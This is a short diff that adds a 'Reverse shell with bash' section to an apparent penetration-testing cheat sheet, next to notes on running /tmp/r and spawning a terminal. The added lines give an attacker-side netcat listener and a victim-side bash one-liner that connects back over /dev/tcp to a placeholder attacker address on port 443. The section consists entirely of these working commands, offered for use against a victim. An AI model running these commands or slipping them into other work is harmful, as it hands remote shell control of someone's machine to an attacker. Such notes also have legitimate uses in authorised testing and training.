@@ -137,6 +137,20 @@ How it work:
     ```bash
     /tmp/r
     ```
+    
+## Reverse shell with bash
+
+1. listener (attacker)  
+
+    ```bash
+    nc -nlvp 443
+    ```
+
+1. powned (victim)  
+
+    ```bash
+    bash -c "bash -i >& /dev/tcp/<pirate_ip>/443 0>&1"
+    ```
 
 ## Spawning a terminal from a shell {-}
 
